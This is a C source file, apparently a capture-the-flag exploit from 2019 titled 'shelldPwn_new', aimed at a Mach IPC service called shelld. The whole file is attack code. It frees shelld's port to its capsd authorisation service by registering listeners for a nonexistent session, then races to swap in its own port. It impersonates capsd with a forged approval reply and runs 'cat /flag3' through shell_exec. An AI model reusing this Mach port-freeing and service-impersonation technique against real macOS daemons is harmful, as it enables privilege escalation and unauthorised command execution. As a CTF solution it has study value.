//
//  main.c
//  shelldPwn_new
//
//  Created by Linus Henze on 04.01.19.
//  Copyright Â© 2019 Linus Henze. All rights reserved.
//

#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <xpc/xpc.h>
#include "shelld.h"

#define TRIES 10000

extern kern_return_t
bootstrap_look_up(mach_port_t  bootstrap_port,
                  char*        service_name,
                  mach_port_t* service_port);

void deallocPortInShelld(mach_port_t shelld, mach_port_t target) {
    for (int i = 0; i < 100; i++) {
        // Session abcd does not exist
        register_listener(shelld, "abcd", target);
    }
}

int main(int argc, const char * argv[]) {
    mach_port_t shelld;
    if (bootstrap_look_up(bootstrap_port, "net.saelo.shelld", &shelld) != KERN_SUCCESS) {
        printf("Couldn't find shelld!\n");
        return -1;
    }
    
    mach_port_t capsd;
    if (bootstrap_look_up(bootstrap_port, "net.saelo.capsd", &capsd) != KERN_SUCCESS) {
        printf("Couldn't find capsd!\n");
        return -1;
    }
    
    deallocPortInShelld(shelld, capsd);
    
    // shelld's port to capsd is now deallocated
    
    // Create pwn session
    char *pwnSession = malloc(4096);
    memset(pwnSession, 'A', 4095);
    pwnSession[4095] = 0;
    
    if (create_session(shelld, pwnSession) != KERN_SUCCESS) {
        printf("Failure to create session!\n");
        return -1;
    }
    
    // We will need this later to dispatch our server
    dispatch_queue_t pwnQueue = dispatch_queue_create("pwn.server", NULL);
    
    mach_port_t listenerPort;
    for (int i = 0; i < TRIES; i++) {
        printf("Try %d\n", i);
        // Create port, register with session
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &listenerPort);
        mach_port_insert_right(mach_task_self(), listenerPort, listenerPort, MACH_MSG_TYPE_MAKE_SEND);
        if (register_listener(shelld, pwnSession, listenerPort) != KERN_SUCCESS) {
            printf("Failure to register port with session!\n");
            return -1;
        }
        
        // Spawn our server, in case we succeed
        dispatch_async(pwnQueue, ^{
            char buf[2048];
            if (mach_msg((mach_msg_header_t*)buf, MACH_RCV_MSG|MACH_MSG_OPTION_NONE|MACH_RCV_TIMEOUT, 0, 2048, listenerPort, 1, 0) == KERN_SUCCESS) {
                // Succeded!
                // Now send reply
                typedef struct {
                    mach_msg_header_t Head;
                    NDR_record_t NDR;
                    kern_return_t RetCode;
                    int result;
                } Reply;
                
                // Some mach magic...
                Reply repl;
                memcpy(&repl, buf, sizeof(mach_msg_header_t));
                repl.RetCode = 0;
                repl.result = 1;
                repl.Head.msgh_id = 733201;
                repl.Head.msgh_bits &= ~MACH_MSGH_BITS_COMPLEX;
                repl.Head.msgh_size = 40;
                repl.Head.msgh_voucher_port = MACH_PORT_NULL;
                repl.Head.msgh_local_port = listenerPort;
                kern_return_t kr = mach_msg_send((mach_msg_header_t*) &repl);
                if (kr != KERN_SUCCESS) {
                    printf("Sending reply failed! %d\n", kr);
                    return;
                }
            }
        });
        
        if (shell_exec(shelld, pwnSession, "cat /flag3") == KERN_SUCCESS) {
            // Get reply and exit
            char buf[2048];
            if (mach_msg((mach_msg_header_t*)buf, MACH_RCV_MSG|MACH_MSG_OPTION_NONE, 0, 2048, listenerPort, MACH_MSG_TIMEOUT_NONE, 0) == KERN_SUCCESS) {
                printf("Successfully received reply!\n");
                typedef struct {
                    mach_msg_header_t Head;
                    uint64_t unk1;
                    uint32_t exitCode;
                    uint32_t unk2;
                    uint32_t unk3;
                    char result[4096];
                } Answer;
                
                Answer *ans = (Answer*) buf;
                printf("Exit code: %u\nResult: %s\n", ans->exitCode, ans->result);
                
                return 0;
            }
            return 0;
        }
        
        // Failed
        // Unregister but do not delete port
        unregister_listener(shelld, pwnSession);
    }
}
